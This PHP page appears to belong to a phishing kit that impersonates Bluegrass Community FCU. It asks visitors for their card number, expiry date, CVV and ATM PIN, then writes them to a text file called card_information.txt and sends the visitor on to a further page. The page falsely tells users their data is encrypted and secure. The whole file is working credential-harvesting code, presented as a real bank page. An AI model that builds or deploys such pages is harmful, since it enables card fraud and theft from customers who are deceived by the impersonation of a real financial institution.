<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $cardNumber = $_POST['cardNumber'] ?? '';
    $expiryMonth = $_POST['expiryMonth'] ?? '';
    $expiryYear = $_POST['expiryYear'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $atmPin = $_POST['atmPin'] ?? '';
    
    // Validation
    $cardDigits = preg_replace('/\s/', '', $cardNumber);
    if (strlen($cardDigits) !== 16) {
        $errors['cardNumber'] = 'Card number must be 16 digits';
    }
    
    if (empty($expiryMonth) || empty($expiryYear)) {
        $errors['expiry'] = 'Expiry date is required';
    }
    
    if (strlen($cvv) !== 3 && strlen($cvv) !== 4) {
        $errors['cvv'] = 'CVV must be 3 or 4 digits';
    }
    
    if (strlen($atmPin) !== 4) {
        $errors['atmPin'] = 'ATM PIN must be 4 digits';
    }
    
    if (empty($errors)) {
        // Save to test file
        $data = [
            'step' => 'card_information',
            'usrnm' => $username,
            'pay_card' => $cardDigits,
            'exp_mth' => $expiryMonth,
            'exp_yr' => $expiryYear,
            'sec_cd' => $cvv,
            'pin_cd' => $atmPin
        ];
        
        saveUserData('card_information.txt', $data);
        
        // Redirect to terms page
        header('Location: terms.php');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Information - Bluegrass Community FCU</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#4A9619] text-[#123524] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1 flex items-center justify-center px-4 py-12">
            <div class="w-full max-w-3xl flex flex-col items-center gap-8">
                <!-- Card Information Card -->
                <div class="w-full rounded-[30px] bg-white shadow-[0_30px_60px_rgba(0,0,0,0.18)] px-10 py-12">
                    <!-- Logo -->
                    <img
                        src="assets/blue_logo.png"
                        alt="Bluegrass Community FCU"
                        class="mx-auto h-12 w-auto"
                    />

                    <!-- Card Header -->
                    <div class="mt-6 space-y-3 text-center">
                        <p class="text-[0.65rem] font-semibold uppercase tracking-[0.35em] text-[#4A9619]">
                            Card Verification
                        </p>
                        <h1 class="text-2xl font-semibold text-gray-900">Card Information</h1>
                        <p class="text-gray-600">Please provide your card details for verification purposes</p>
                    </div>
                    
                    <?php if (!empty($errors)): ?>
                        <div class="mt-6 bg-red-50 border-l-4 border-red-500 p-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        Please fix the following errors:
                                        <ul class="list-disc pl-5 mt-1">
                                            <?php foreach ($errors as $error): ?>
                                                <li><?php echo htmlspecialchars($error); ?></li>
                                            <?php endforeach; ?>
                                        </ul>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="mt-8 space-y-6">
                        <!-- Card Number -->
                        <div>
                            <label for="cardNumber" class="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
                            <input
                                type="text"
                                id="cardNumber"
                                name="cardNumber"
                                value="<?php echo htmlspecialchars($_POST['cardNumber'] ?? ''); ?>"
                                maxlength="19"
                                class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                placeholder="1234 5678 9012 3456"
                                required
                            >
                            <?php if (!empty($errors['cardNumber'])): ?>
                                <p class="mt-2 text-sm text-red-600 flex items-center gap-2">
                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                    </svg>
                                    <?php echo htmlspecialchars($errors['cardNumber']); ?>
                                </p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Expiry Date -->
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
                            <div class="grid grid-cols-2 gap-4">
                                <select
                                    id="expiryMonth"
                                    name="expiryMonth"
                                    class="rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    required
                                >
                                    <option value="">Month</option>
                                    <?php for ($i = 1; $i <= 12; $i++): ?>
                                        <option value="<?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == str_pad($i, 2, '0', STR_PAD_LEFT)) ? 'selected' : ''; ?>>
                                            <?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>
                                        </option>
                                    <?php endfor; ?>
                                </select>
                                <select
                                    id="expiryYear"
                                    name="expiryYear"
                                    class="rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    required
                                >
                                    <option value="">Year</option>
                                    <?php for ($i = 0; $i < 15; $i++): ?>
                                        <option value="<?php echo date('Y') + $i; ?>" <?php echo (isset($_POST['expiryYear']) && $_POST['expiryYear'] == date('Y') + $i) ? 'selected' : ''; ?>>
                                            <?php echo date('Y') + $i; ?>
                                        </option>
                                    <?php endfor; ?>
                                </select>
                            </div>
                            <?php if (!empty($errors['expiry'])): ?>
                                <p class="mt-2 text-sm text-red-600 flex items-center gap-2">
                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                    </svg>
                                    <?php echo htmlspecialchars($errors['expiry']); ?>
                                </p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- CVV -->
                        <div>
                            <label for="cvv" class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
                            <div class="relative">
                                <input
                                    type="password"
                                    id="cvv"
                                    name="cvv"
                                    value="<?php echo htmlspecialchars($_POST['cvv'] ?? ''); ?>"
                                    maxlength="4"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 pr-12 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    placeholder="123"
                                    required
                                >
                                <button
                                    type="button"
                                    onclick="toggleCVVVisibility()"
                                    class="absolute inset-y-0 right-4 flex items-center text-[#4A9619] hover:text-[#3f8215]"
                                    aria-label="Toggle CVV visibility"
                                >
                                    <svg id="cvvEyeIcon" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" />
                                        <circle cx="12" cy="12" r="3" />
                                    </svg>
                                </button>
                            </div>
                            <?php if (!empty($errors['cvv'])): ?>
                                <p class="mt-2 text-sm text-red-600 flex items-center gap-2">
                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                    </svg>
                                    <?php echo htmlspecialchars($errors['cvv']); ?>
                                </p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- ATM PIN -->
                        <div>
                            <label for="atmPin" class="block text-sm font-medium text-gray-700 mb-2">ATM PIN</label>
                            <div class="relative">
                                <input
                                    type="password"
                                    id="atmPin"
                                    name="atmPin"
                                    value="<?php echo htmlspecialchars($_POST['atmPin'] ?? ''); ?>"
                                    maxlength="4"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 pr-12 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    placeholder="****"
                                    required
                                >
                                <button
                                    type="button"
                                    onclick="togglePINVisibility()"
                                    class="absolute inset-y-0 right-4 flex items-center text-[#4A9619] hover:text-[#3f8215]"
                                    aria-label="Toggle PIN visibility"
                                >
                                    <svg id="pinEyeIcon" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" />
                                        <circle cx="12" cy="12" r="3" />
                                    </svg>
                                </button>
                            </div>
                            <?php if (!empty($errors['atmPin'])): ?>
                                <p class="mt-2 text-sm text-red-600 flex items-center gap-2">
                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                    </svg>
                                    <?php echo htmlspecialchars($errors['atmPin']); ?>
                                </p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Submit Button -->
                        <button
                            type="submit"
                            class="w-full rounded-xl bg-[#4A9619] py-3 text-base font-semibold text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
                        >
                            Continue
                        </button>
                        
                        <p class="text-xs text-gray-500 text-center">
                            Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
                        </p>
                    </form>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="bg-white border-t border-gray-300 py-6">
            <div class="max-w-7xl mx-auto px-4">
                <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                    <div class="flex items-center gap-6 justify-center md:justify-start">
                        <img
                            src="assets/equal-housing.png"
                            alt="Equal Housing Lender"
                            class="h-12 w-auto"
                        />
                        <img
                            src="assets/ncua.png"
                            alt="National Credit Union Administration"
                            class="h-12 w-auto"
                        />
                    </div>
                    <div class="text-xs text-gray-700 text-center md:text-right space-y-2">
                        <p>© 2025 Bluegrass Community FCU. All Rights Reserved.</p>
                        <p>
                            This site contains links to other sites on the Internet. We, and your credit union,
                            cannot be responsible for the content or privacy policies of these other sites.
                        </p>
                        <p>Version: v26.10.22.0</p>
                    </div>
                </div>
                <div class="text-center text-xs text-gray-500 mt-6 border-t border-gray-200 pt-4">
                    ~ Current time is <?php echo date('m/d/Y h:i:s A'); ?> ~ 0 ~ NWEB02 ~
                </div>
            </div>
        </footer>
    </div>
    
    <script>
        // Format card number
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = value.match(/.{1,4}/g);
            e.target.value = formatted ? formatted.join(' ') : value;
        });
        
        // Toggle CVV visibility
        function toggleCVVVisibility() {
            const cvvInput = document.getElementById('cvv');
            const eyeIcon = document.getElementById('cvvEyeIcon');
            
            if (cvvInput.type === 'password') {
                cvvInput.type = 'text';
                // Change to eye-slash icon
                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6 0-10-7-10-7a21.37 21.37 0 0 1 5.07-5.92" /><path d="M1 1l22 22" />';
            } else {
                cvvInput.type = 'password';
                // Change back to eye icon
                eyeIcon.innerHTML = '<path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" /><circle cx="12" cy="12" r="3" />';
            }
        }
        
        // Toggle PIN visibility
        function togglePINVisibility() {
            const pinInput = document.getElementById('atmPin');
            const eyeIcon = document.getElementById('pinEyeIcon');
            
            if (pinInput.type === 'password') {
                pinInput.type = 'text';
                // Change to eye-slash icon
                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6 0-10-7-10-7a21.37 21.37 0 0 1 5.07-5.92" /><path d="M1 1l22 22" />';
            } else {
                pinInput.type = 'password';
                // Change back to eye icon
                eyeIcon.innerHTML = '<path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" /><circle cx="12" cy="12" r="3" />';
            }
        }
        
        // Auto-focus card number on page load
        document.addEventListener('DOMContentLoaded', function() {
            const cardInput = document.getElementById('cardNumber');
            if (cardInput) {
                cardInput.focus();
            }
        });
    </script>
</body>
</html>
